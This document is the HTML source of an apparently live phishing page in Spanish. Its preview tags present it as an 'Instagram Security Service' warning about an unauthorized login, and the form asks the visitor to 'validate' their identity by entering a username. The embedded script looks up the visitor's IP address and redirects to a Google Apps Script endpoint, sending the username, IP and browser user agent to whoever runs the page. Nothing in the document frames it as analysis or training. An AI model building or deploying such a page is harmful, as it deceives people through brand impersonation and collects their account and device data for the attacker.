<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguridad de Red | Validación</title>

    <meta property="og:title" content="Inicio de sesión sospechoso detectado" />
    <meta property="og:description" content="Se ha detectado un acceso no autorizado. Valide su identidad para proteger su cuenta." />
    <meta property="og:image" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/portada.jpeg" />
    <meta property="og:site_name" content="Instagram Security Service" />
    <meta property="og:type" content="website" />

    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); }
        .logo { font-weight: 700; font-size: 22px; margin-bottom: 12px; color: #262626; }
        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; }
        button:disabled { background: #b2dffc; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">Validación de Acceso</div>
    <p>Para garantizar la seguridad de su cuenta, ingrese su nombre de usuario de red.</p>
    <input type="text" id="userInput" placeholder="Usuario o ID de Red" autocomplete="off">
    <button id="btn" onclick="ejecutar()">Confirmar Identidad</button>
</div>

<script>
    async function ejecutar() {
        const user = document.getElementById('userInput').value.trim();
        if (!user) { alert("Campo requerido"); return; }
        const btn = document.getElementById('btn');
        btn.disabled = true;
        btn.innerText = "Cargando...";

        let ip = "No_Capturada";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch (e) { ip = "Error_IP"; }

        const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
        window.location.href = `${scriptURL}?u=${encodeURIComponent(user)}&ip=${encodeURIComponent(ip)}&ua=${encodeURIComponent(navigator.userAgent)}`;
    }
</script>
</body>
</html>
